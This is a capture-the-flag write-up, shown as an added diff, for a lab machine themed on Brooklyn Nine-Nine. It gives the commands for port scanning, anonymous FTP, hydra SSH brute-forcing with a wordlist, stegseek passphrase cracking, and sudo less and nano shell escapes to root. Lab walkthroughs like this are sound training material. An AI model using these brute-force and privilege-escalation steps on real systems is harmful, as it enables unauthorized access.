@@ -1,0 +1,106 @@
+As usual i started with rustscan 
+
+rustscan -a 10.10.193.175
+
+Open 10.10.193.175:22
+Open 10.10.193.175:21
+Open 10.10.193.175:80
+
+saw that ftp has anonymous access allowed entered into ftp directory saw file named 
+note_to_jake.txt
+downloaded that file using 
+get filename
+
+read that file
+===================
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+===================
+
+so i though that this is hint to brutforce ssh with user name jake! i started brutforcing ssh with jake as username! and got the password for jake!
+
+===================
+
+hydra -l jake -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.193.175 ssh -t 23 -Vv -I
+
+[22][ssh] host: 10.10.193.175   login: jake   password: 987654321
+
+logged into the user jake ssh account and ran the command sudo -l 
+jake have perms to  run less command with sudo priv
+(ALL) NOPASSWD: /usr/bin/less
+
+now time for priv esc! searched for less sudo exploit in gtfobins and got this!
+
+sudo less /etc/profile
+!/bin/sh
+
+==================
+
+this will give  you root priv in the nine nine machine
+and cheers now you are root!
+
+root@brookly_nine_nine:~# whoami
+root
+root@brookly_nine_nine:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+other way to hack into the machine is!
+
+i opened the website hosted at port 80 and saw the source code! there was a comment given at the bottom related to steganography
+<!-- Have you ever heard of steganography? -->
+
+so i though of downloading the image! but how can i download the image given at the main page ! 
+
+just see the source code again! in the .bg class we are givem with the url
+there the name of the image file is written ie  brooklyn99.jpg
+
+http://10.10.193.175/brooklyn99.jpg
+
+i just visited that and downloaded the image file : index.jpg
+
+and started searching for embeded files into the image! and though of using steghide but it was asking for passphrase!
+
+steghide --extract -sf index.jpg
+
+so i bruteforce the stego file passphrase with the help of stegseek
+
+syntax : stegseek -wl nameofwordlist -sf stegofilename
+
+this will crack the passphrase of the index.jpg file ie : admin
+
+{you can use another tool too stegcracker to crack the passphrace of the .jpg file 
+syntax : stegcracker file wordlist}
+
+
+now after cracking the password for the stego file you will get a text file which will have the creds for a user!
+
+==================
+
+Holts Password:
+fluffydog12@ninenine
+
+==================
+
+Enjoy!!
+
+so here we have password for the user holt
+
+logged in into the machine with ssh creds
+ssh holt@ip
+
+and did sudo -l command
+
+==================
+
+(ALL) NOPASSWD: /bin/nano
+ here holt user have perms to run nano binary file with sudo priv so i again searched for nano on gtfobins and got this
+
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+
+==================
+
+(in linux ^ represent ctrl)
+and now we have root! 
